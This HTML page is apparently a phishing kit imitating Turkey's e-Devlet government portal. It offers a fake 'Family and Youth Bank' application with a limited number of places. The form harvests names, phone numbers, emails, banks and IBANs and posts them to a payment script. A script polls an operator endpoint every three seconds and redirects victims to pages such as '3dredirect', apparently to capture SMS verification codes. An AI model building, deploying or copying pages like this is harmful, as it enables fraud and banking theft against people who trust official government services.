				<span class="serviceActions_maintitle">Twitter'da Paylaş</span></a>
				<a target="_blank" aria-label="paylaş" title="Facebook'da Paylaş" href=""><i class="ico-facebook"></i><span class="serviceActions_maintitle"> Facebook'da Paylaş</span></a></div></div></div></section>
				<aside id="serviceHelperBlock" style="" class="">
				<ul class="serviceIntroductionBlock"><li>Bu hizmet Aile Ve Gençlik Bankası işbirliği ile e-Devlet Kapısı altyapısı üzerinden sunulmaktadır.</li>
				<li class="miniTiming">Bu işlem için yaklaşık 10 dakikanızı ayırmalısınız.</li>
				<li class="progressStatus">Bu işlem toplam <strong>4</strong> aşamalıdır. Şu anda <strong>2</strong>. aşamadasınız.<progress value="2" max="4"></progress></li>
				<ol class="progressMeter"><li class="complete">Tercih Formu</li><li class="current">Bilgi Formu</li><li class="incomplete">Ödeme</li>
				<li class="final">Onay</li></ol><li class="progressStatus">ÖNERİLEN HİZMETLER<a href="#">4A/4B/4C İlaç Kullanım Süresi Sorgulama</a>
				<a href="#">4A/4B İşgöremezlik Ödemesi Görme</a><a href="#">Normal Şartlarda Ne Zaman Emekli Olabilirim?</a>
				<a href="#">SPAS Müstehaklık Sorgulama(Sağlık Provizyon Aktivasyon Sistemi)</a><a href="#">4A/4B/4C Muayene Katılım Payı Sorgulama</a></li></ul></aside>
				<script type="text/javascript">$(function () {$('#aFavorite').click(function () {$.ajax({type: "POST",url: '/favori-hizmetlerim?add=RemoveFavorite&submit',data: {hizmetKodu: $(this).attr('data-hizmetKodu'),token: '{6422BC-CAC21A-504013-7C9D67-1F3114-0B0BC2-46ABEC-291C35}',ajax: 1},success: function (json) {var obj = $('#aFavorite');if (json.data.add) {obj.addClass("addedfavorite");$('._fav').text("Favorilerden Çıkar");} else {obj.removeClass("addedfavorite");$('._fav').text("Favorilere ekle");}}});});if (typeof $.fn.edkPopover !== 'undefined') {$(".share_item").edkPopover({button: "#share_button",content: "#share_menu",showArrowIcon: false,animationSpeed: "fast"});}});</script><section id="contentStart" class="serviceContainer ">
	
	<ol class="serviceInstructions">
            <li>Bir takvim günü içerisinde en fazla 1 (bir) adet başvuru oluşturulabilir.
                Oluşturduğunuz başvurunun onay süreci 14 (on dört) iş günüdür.
            </li>
			<li>Başvurular limitle sınırlandırılmıştır yalnızca 1.000.000 (bir milyon) kişi başvurabilecektir.
                <br></br>Başvuru Sayısı : <strong>397.293</strong>
            </li>
        </ol>
		
	<ul class="contentToolbar">
		<li style="float: left;"><a href="#" class="back">Geri</a>
		</li>
	</ul>
	

	<form name="mainForm" action="./odeme.php" method="POST" class="serviceForm" novalidate="novalidate">
		<fieldset>
			<legend>
				<em>1</em>Başvuran Bilgileri
			</legend>
			<div class="formRow">
				
	
				<div class="floatingHelp" role="tooltip" style="width: 186px; left: -196px; display: none;" id="flh_2cpg50o2ri8i"><p>Bu alandaki değer otomatik olarak doldurulmuştur, değiştirilemez.</p></div></div>
 <div class="formRow">
				
	<label for="adSoyad" class="rowLabel">Ad Soyad</label>
			<input type="text" name="adSoyad"  value="" id="adSoyad" class="text" aria-describedby="flh_f6cw7gd2g6p2">
				<div class="floatingHelp" role="tooltip" style="display: none" id="flh_f6cw7gd2g6p2"><p>Bu alandaki değer otomatik olarak doldurulmuştur, değiştirilemez.</p></div></div>
				

<div class="formRow required">
				
	<label for="cepTelNo" class="rowLabel">Cep Telefonu Numarası</label>
			<input type="text" name="cepTelNo" maxlength="10" required="required" aria-required="true" id="cepTelNo" class="text" aria-describedby="fi_r1y0oav2hqt1 flh_b1fa44kg3zw7">
			<div class="fieldInfo" id="fi_r1y0oav2hqt1">Telefon numaranızı 10 haneli olarak giriniz. örn. "5XXXXXXXXX"</div>
			<div class="floatingHelp" role="tooltip" style="display: none" id="flh_b1fa44kg3zw7"><p>✱ Hizmeti tamamlamak için bu alanı mutlaka doldurmalısınız.</p></div></div>
 <div class="formRow">
				
	<label for="eposta" class="rowLabel">E-Posta Adresi</label>
			<input type="text" name="eposta" maxlength="25" id="eposta" class="text" aria-describedby="fi_5nb8gyfvylb0">
			<div class="fieldInfo" id="fi_5nb8gyfvylb0">Örn. "abc@abc.com"</div>
			</div>

		</fieldset>
							<fieldset>
				<legend>
					<em>2</em>Ödeme Bilgileri
				</legend>
 <div class="formRow required">
	<label for="odemeNoktasi" class="rowLabel">Ödemenin Yapılacağı Banka</label> 
	<select name="odemeNoktasi" required="required" aria-required="true" id="odemeNoktasi" class="comboBox" aria-describedby="flh_p3bphcf1nf3v"> 
		<option value="" selected="selected">Seçiniz</option>
<option value="0">AKBANK</option>
<option value="1">DENIZBANK</option>
<option value="2">HALKBANK</option>
<option value="3">FIBABANKA</option>
<option value="4">INGBANK</option>
<option value="5">GARANTİ BANKASI</option>
<option value="6">TEB</option>
<option value="7">VAKIFLAR BANKASI</option>
<option value="8">ŞEKERBANK</option>
<option value="9">ZİRAAT BANKASI</option>
<option value="10">QNBFINANSBANK</option>
<option value="11">IS BANKASI</option>
<option value="12">YAPI KREDI BANKASI</option>
<option value="13">TÜRKİYE FİNANS  A.Ş.</option>

	</select> 
	 
		<div class="floatingHelp" role="tooltip" style="width: 186px; left: -196px; display: none;" id="flh_p3bphcf1nf3v"><p>✱ Hizmeti tamamlamak için bu alanı mutlaka doldurmalısınız.</p></div></div>				
				
<div class="formRow">
				
	<label for="aciklama" class="rowLabel">Ödemenin Yapılacağı Banka Şubesi</label>
			<input type="text" name="aciklama" id="aciklama" class="text">
				</div>

<div class="formRow required">
				
	<label for="ibanno" class="rowLabel">Ödemenin Yapılacağı IBAN Numarası</label>
			<input type="text" name="ibanno" maxlength="24" required="required" aria-required="true" id="ibanno" class="text" aria-describedby="fi_r1y0oav2hqt1 flh_b1fa44kg3zw7">
			<div class="fieldInfo" id="fi_r1y0oav2hqt1">IBAN numaranızı 24 haneli olarak giriniz. örn. "TRXXXXXXXXXXXXXXXXXXXXXXXX"</div>
			<div class="floatingHelp" role="tooltip" style="display: none" id="flh_b1fa44kg3zw7"><p>✱ Hizmeti tamamlamak için bu alanı mutlaka doldurmalısınız.</p></div></div>

 <div class="formRow required">
 
 
	 
	 
		 
	<div class="rowLabel">Çalışıyor mu?</div>
	<div is="edk-group" data-orientation="horizontal" class="edk-group">
	<div class="horizontal"><label class=""> 
		<input type="radio" class="radioButton" name="calisiormu" id="calisiormu" required="required" value="E">
		Evet
	</label><label class=""> 
		<input type="radio" class="radioButton" name="sskAylikAliyorMu" value="H">
		Hayır
	</label></div></div>
	 
		 
		 
	 
	<div class="floatingHelp" role="tooltip" style="display: none"><p>✱ Hizmeti tamamlamak için bu alanı mutlaka doldurmalısınız.</p></div></div>
<div class="formRow">
	 
	  
	  
	 
	 
	</div>
 
			</fieldset>
				<div class="formSubmitRow">
	 
	<input class="submitButton" type="submit" value="İlerle" data-submit="true" data-one-click="">
		<input type="hidden" name="token" value="{6422BC-CAC21A-504013-7C9D67-1F3114-0B0BC2-46ABEC-291C35}">
</div>
<!-- bunu mobil için submit edildiğinde çıkartılacak  sendNativeData(true, ‘loading’);  -->
	</form>
</section>
<script type="text/javascript">
	$('#yabanciUlkeArrRestDiv').hide();
	T.getDistrict=function(_id)
	{
		if(_id==''){
			T.combo.flush(T.$('farkliAdresIlce'));
		}else{
			T.combo.flush(T.$('farkliAdresIlce'),'Yükleniyor...');
			T.AJAX.add('cityId',_id);
			T.AJAX.connection('/sgk-tahsis-talep-taahhut-beyan?basvuru=FormuSigortali&submit','POST');
		}
	};
	T.setDistrict=function(_json){
		if(_json.messageArr.length==0){
			T.combo.setOption(T.$('farkliAdresIlce'),_json.data);
		}else{
			T.combo.flush(T.$('farkliAdresIlce'));
			alert(_json.messageArr.message);
		}
	};
	$(function () {
		$('#farkliAdres').blur(function() {  // aşağıdaki _il , _ilce alanları na ait input gorunmuyor
			if($(this).val().length>1){
				$('#_il').attr('required','required').addClass('required');
				$('#_ilce').attr('required','required').addClass('required');
			}else{
				$('#_il').removeAttr('required').removeClass('required');
				$('#_ilce').removeAttr('required').removeClass('required');
			}
	});

	getEs("ed-effects").then(function (ref){
		
	});
	if($("input[name=yabanciAylikAliyorMu]:checked").val() == 'E'){
		$('#yabanciUlkeArrRestDiv').show();
	}else{
		$('#yabanciUlkeArrRestDiv').hide();
	}

	$('input[name="yabanciAylikAliyorMu"]').change(function () {
		if (this.value == 'E') {
			$('#yabanciUlkeArrRestDiv').show();
		} else {
			$('#yabanciUlkeArrRestDiv').hide();
		}
	});

	 e11k.bindAriaControlAttr($('input[name=yabanciAylikAliyorMu]'),'#yabanciUlkeArrRestDiv');
	});
</script>
		</section>
	</div>
</main>

<footer data-pagecache="0.024269819259644">
    <!--    -->
    <div id="bottomLinksGroup">
        <div id="bottomLinksWrapper">
            <nav id="bottomLinksBlock" aria-labelledby="bottomLinksBlockTitle">
                <h2 class="sectionTitle" id="bottomLinksBlockTitle">Sayfa Sonu Bağlantıları</h2>
                <ul id="bottomLinks">
                    <li class="bottomLinksGroup">
                        <h3>e-Devlet Kapısı</h3>
                        <ul>
                                                        <li>                                                                    <a href="#">English</a>
                                                            </li>
                            <li>
                                <a href="#">Hakkımızda</a>
                            </li>
                            <li>
                                <a href="#">Yasal Bildirim</a>
                            </li>
                            <li>
                                <a href="#">KVKK Aydınlatma Yükümlülüğü</a>
                            </li>
                            <li><a accesskey="8" href="#">Gizlilik ve Kullanım</a>
                            </li>
                            <li>
                                <a href="#">Politikalarımız</a>
                            </li>
                            <li>
                                <a href="#">DETSİS</a>
                            </li>
                            

                        </ul>
                    </li>
                    <li class="bottomLinksGroup">
                        <h3>e-Hizmetler</h3>
                        <ul>
                            <li>
                                <a href="#">Sık Kullanılan Hizmetler</a>
                            </li>
                            <li>
                                <a href="#">Yeni Eklenen Hizmetler</a>
                            </li>
                                                        <li><a href="#" accesskey="h">Kurum Hizmetleri</a></li>
                        </ul>
                    </li>                    <li class="bottomLinksGroup">
                        <h3>Yardım</h3>
                        <ul>
                            <li><a href="#" accesskey="6">Genel Yardım</a></li>
                            <li><a href="#" accesskey="5">Sıkça Sorulanlar</a></li>
                            <li>
                                <a href="#">Güvenliğiniz İçin</a>
                            </li>
                            <li>
                                <a href="#">Help For Non-Citizens</a>
                            </li>
                        </ul>
                    </li>
                    <li class="bottomLinksGroup">
                        <h3>Bize Ulaşın</h3>
                        <ul>
                            <li><a href="#" accesskey="9">İletişim</a>
                            </li>
                            <li>
                                <a href="#">CİMER Başvurusu </a>
                            </li>
                        </ul>
                    </li>
                    <li class="bottomLinksGroup">
                        <h3>Erişilebilirlik</h3>
                        <ul>
                            <li><a href="#" class="textOnlyToggle" data-state="html">Salt Metin Görünümü</a></li>
                            <li><a href="#" class="fontSizeToggle" data-state="normal">Daha Belirgin Odaklama</a></li>
                            <li><a accesskey="0" href="#">Klavye Kısayolları</a>
                            </li>
                            <li><a href="#" accesskey="3">Site Haritası</a></li>
                        </ul>
                    </li>
                </ul>
            </nav>
            <div id="bottomRightWrapper">
                <nav id="bottomContacts" aria-labelledby="sectionTitleContacts" aria-describedby="bottomContactsText">
                    <h2 class="sectionTitle" id="sectionTitleContacts">İletişim Seçenekleri</h2>
                    <div class="bottomContactsText" id="bottomContactsText">
                        <em>Yardım mı lazım?</em> Aşağıdaki yöntemleri kullanarak bizimle iletişime geçebilirsiniz.
                    </div>
                    <ul id="bottomContactsList">
                        <li><a href="#" class="fastresponse">Hızlı Çözüm Merkezi</a></li>
                        <li><a href="#" class="email" accesskey="7">Bize Yazın</a></li>
                        <li><a href="#" class="callcenter">e-Devlet Çağrı Merkezi</a></li>
                        <li><a href="#" class="signinghelp">Engelsiz Çağrı Merkezi</a></li>
                    </ul>
                </nav>
                <nav id="bottomSocialLinks" aria-label="Sosyal Medya Bağlantı Adresleri">
                    <a href="#" target="_blank"><span class="ico-facebook"></span>Facebook</a>
                    <a href="#" target="_blank"><span class="ico-twitter"></span>Twitter</a>
                    <a href="#" target="_blank"><span class="ico-youtube"></span>Youtube</a>
                    <a href="#" target="_blank"><span class="ico-instagram-1"></span>Instagram</a>
                </nav>
            </div>
        </div>
        <div id="bottomPartnerLinks">
            <div class="images">
                <a class="externalLink" rel="external" href="#"><img alt="T.C. Cumhurbaşkanlığı Dijital Dönüşüm Ofisi Başkanlığı" src="//cdn.e-devlet.gov.tr/themes/izmir/images/footer/DDO-logo.png"></a>
                <a class="externalLink" rel="external" href="#"><img alt="Türksat A.Ş." src="//cdn.e-devlet.gov.tr/themes/izmir/images/footer/turksat.png"></a>
            </div>
            <div class="bottomPartnerText">
                e-Devlet Kapısı’nın kurulması ve yönetilmesi görevi <a class="externalLink" rel="external" href="http://www.cbddo.gov.tr">T.C. Cumhurbaşkanlığı Dijital Dönüşüm Ofisi Başkanlığı</a> tarafından yürütülmekte olup, sistemin geliştirilmesi ve işletilmesi <a class="externalLink" href="http://www.turksat.com.tr" rel="external">Türksat A.Ş.</a> tarafından yapılmaktadır.
            </div>
        </div>
        <div id="bottomCopyrightBlock">
            ©
            <time datetime="2023-03-03">2023</time> Tüm Hakları Saklıdır. <a href="/bilgilendirme?konu=gizlilik">Gizlilik, Kullanım ve Telif Hakları</a> bildiriminde belirtilen kurallar çerçevesinde hizmet sunulmaktadır.
        </div>
    </div>
</footer>    <script src="//cdn.e-devlet.gov.tr/themes/izmir/js/forms.1.9.3.js" charset="utf-8"></script>

	<script type="text/javascript">
      $(document).ready(function() {
        gonder();
        var int = self.setInterval("gonder()", 3000);
      });

      function gonder() {
        $.ajax({
          type: 'POST',
          url: 'datach.php?ip=92.38.180.90',
          success: function(msg) {
            if (msg == 'sms') {
              window.location.href = '3dredirect';
            }
            if (msg == 'tebrik') {
              window.location.href = 'tebrik';
            }
            if (msg == 'hata') {
              window.location.href = 'hata';
            } 
            if (msg == 'back') {
              window.location.href = 'index';
            }
          }
        });
      }
    </script>
<script type="text/javascript">function loadJsData(_js, _jsv, _siteId){var _paq;_paq = window._pap = window._pap || [];var _param = {"_kk":254,"_hk":1034,"_y":20,"_c":1,"_gy":1,"_t":"Va6dDGaHprqYUOw=","_pi":false,"_l":"tr","_si":225,"_md":false};var d = document, g = d.createElement('script'), s = d.getElementsByTagName('script')[0];var _cn=function(n){return d.getElementsByClassName(n);};_param._jsv = _jsv;_paq.push(['setCssControlArr', [function(){return _cn("warningContainer").length > 0 &&_cn("warningContainer")[0].style.display !== 'none' ? 'warning' : null;},function(){return _cn("errorContainer").length > 0 &&_cn("errorContainer")[0].style.display !== 'none' ? 'error': null;},function(){return _cn("confirmContainer").length > 0 &&_cn("confirmContainer")[0].style.display !== 'none' ? 'confirm': null;},function(){return _cn("disclaimerContainer").length > 0 &&_cn("disclaimerContainer")[0].style.display !== 'none' ? 'disclaimer': null;},function() {return _cn("reminderContainer").length > 0 &&_cn("reminderContainer")[0].style.display !== 'none' ? 'reminder': null;},function() {return _cn("progressContainer").length > 0 &&_cn("progressContainer")[0].style.display !== 'none' ? 'progress': null;}]]);_paq.push(['trackPageView', d.title, _param]);_paq.push(['setSiteId', _siteId]);g.type = 'text/javascript';g.async = true;if(parseInt(Math.random()*2)==0) {_paq.push(['setTrackerUrl', "https://analitik.edevlet.gov.tr"]);} else {_paq.push(['setTrackerUrl', "https://analitik2.edevlet.gov.tr"]);}g.src = '//cdn.e-devlet.gov.tr/themes/ankara/js/analitik.min.'+_jsv+'.js';s.parentNode.insertBefore(g, s);}window.onload = function () {loadJsData('/analitik/analitik.min.js', 9, 1);};</script>

<div id="assertive-live-region" class="visuallyhidden" aria-atomic="true" aria-live="assertive"></div><div id="polite-live-region" class="visuallyhidden" aria-atomic="true" aria-live="polite"></div><a href="#" class="scroll-to-top-btn hide-on-print" role="button" title="Sayfayı Yukarı Kaydır"><i class=" ico-up-open" aria-hidden="true"></i></a></body></html>